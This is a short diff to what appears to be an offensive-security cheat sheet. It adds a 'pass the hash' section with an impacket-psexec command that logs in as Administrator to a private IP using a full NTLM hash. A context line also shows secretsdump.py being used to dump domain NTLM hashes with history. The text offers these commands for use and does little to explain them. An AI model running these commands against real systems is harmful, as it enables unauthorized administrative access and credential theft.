@@ -389,3 +389,15 @@ secretsdump.py -just-dc-ntlm -history -pwd-last-set -user-status <DOMAIN>/<USER>
 ```
 
 ---------------
+
+### Pass the hash with win-pthexe
+
+---------------
+
+- Pass the hash-:
+
+```bash
+impacket-psexec -hashes aad3b435b51404eeaad3b435b51404ee:57c5a5bc7c0e1f98e9c9d81161e74c44 Administrator@192.168.232.129
+```
+
+-----------------
